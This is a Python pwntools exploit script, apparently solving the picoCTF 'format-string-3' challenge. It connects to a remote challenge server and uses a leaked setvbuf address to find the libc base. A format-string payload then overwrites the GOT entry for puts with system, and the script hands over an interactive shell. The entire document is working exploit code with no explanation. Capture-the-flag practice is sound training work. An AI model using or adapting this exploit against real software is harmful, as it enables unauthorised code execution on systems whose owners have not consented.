#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def main():
    # io = process([exe.path])
    io = remote("rhea.picoctf.net", 60363)
    io.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
    libc_addr = io.recvline()
    libc.address = int(libc_addr, 16) - libc.symbols["setvbuf"]
    print(f"libc base: {hex(libc.address)}")

    payload = fmtstr_payload(
        38, {exe.got["puts"]: libc.symbols["system"]}, write_size="short"
    )

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
